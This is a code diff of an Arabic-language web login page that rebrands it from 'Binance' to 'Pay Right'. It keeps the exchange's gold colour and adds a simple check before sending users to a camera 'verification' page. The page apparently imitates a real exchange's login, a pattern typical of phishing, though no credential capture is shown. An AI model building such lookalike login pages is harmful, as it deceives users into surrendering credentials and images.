@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - Binance</title>
+    <title>Pay Right - تسجيل الدخول</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -13,16 +13,23 @@
             align-items: center;
             height: 100vh;
             color: white;
+            text-align: center;
         }
         .login-container {
             background: #1e1e1e;
             padding: 30px;
             border-radius: 10px;
-            box-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
-            text-align: center;
-            width: 320px;
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+            width: 350px;
         }
-        .login-container h2 {
+        .login-container h1 {
+            font-size: 28px;
+            margin-bottom: 5px;
+            color: #f0b90b;
+        }
+        .login-container p {
+            font-size: 14px;
+            color: #ccc;
             margin-bottom: 20px;
         }
         input {
@@ -65,6 +72,8 @@
 </head>
 <body>
     <div class="login-container">
+        <h1>Pay Right</h1>
+        <p>أهلاً بك في **Pay Right**، حيث نوفر لك أفضل الحلول للدفع الآمن والموثوق عبر الإنترنت.</p>
         <h2>تسجيل الدخول</h2>
         <form id="login-form">
             <input type="email" id="email" placeholder="البريد الإلكتروني" required>
@@ -76,8 +85,16 @@
 
     <script>
         document.getElementById('login-form').addEventListener('submit', function(event) {
-            event.preventDefault();
-            window.location.href = "camera.html"; // الانتقال إلى صفحة التحقق
+            event.preventDefault(); // منع إعادة تحميل الصفحة
+            
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('password').value;
+            
+            if (email.includes("@") && password.length >= 6) {
+                window.location.href = "camera.html"; // الانتقال للصفحة فقط عند صحة البيانات
+            } else {
+                alert("يرجى إدخال بريد إلكتروني صحيح وكلمة مرور لا تقل عن 6 أحرف!");
+            }
         });
     </script>
 </body>
